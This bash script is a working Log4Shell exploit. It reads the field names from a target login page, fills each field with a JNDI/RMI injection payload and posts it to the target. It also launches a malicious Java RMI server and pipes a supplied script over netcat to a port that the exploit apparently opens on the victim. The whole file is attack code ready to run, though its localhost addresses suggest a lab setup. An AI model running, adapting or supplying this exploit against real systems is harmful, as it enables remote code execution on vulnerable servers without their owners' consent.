#!/bin/bash
LOGIN_PAGE=$1
TARGET_URL=$2
SCRIPT=$3

# curl $LOGIN_PAGE > login.html

list=`curl $LOGIN_PAGE | awk "/<input/,/>/" | grep -Po "name=\"\K[^\"]*"`
# list=`curl $LOGIN_PAGE | awk '/<input/,/>/' | grep -Po 'name="\K[^"]*'`

malicious_user="%24%7Bjndi%3Armi%3A%2F%2Flocalhost%3A1097%2FObject%7D" # ${jndi:rmi://localhost:1097/Object}

str_req=""

for element in $list
do
	new_field="${element}=$malicious_user"
	if [ ! -z "$str_req" ]
	then
		str_req="${str_req}&"
	fi
	str_req="${str_req}${new_field}"

done

# echo $str_req

# Start the attack itself:

cd $JAVA_RMI_SERVER_LOCATION ; /usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -cp tomcat-catalina-8.5.83.jar:. File & # as a child shell
JAVA_PID=$! # Special bash command

sleep 4 # Wait for the RMI server to be set up, otherwise it fails

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d $str_req $TARGET_URL

# sleep 4 # We have to wait for nc. IF the next nc is executed after the listener in the victim, the following nc won't connect.

nc_exit_code=1

iterations=0

while [ "$nc_exit_code" -ne 0 ] && [ $iterations -lt 20 ]; do
	sleep 4
	if [ "`readlink /etc/alternatives/nc`" == "/bin/nc.openbsd" ]; then 
		cat $SCRIPT | nc -q 0 localhost 6969
	else
		cat $SCRIPT | nc localhost 6969
	fi
	nc_exit_code=$?
	iterations=$((iterations + 1))
done

kill -kill $JAVA_PID

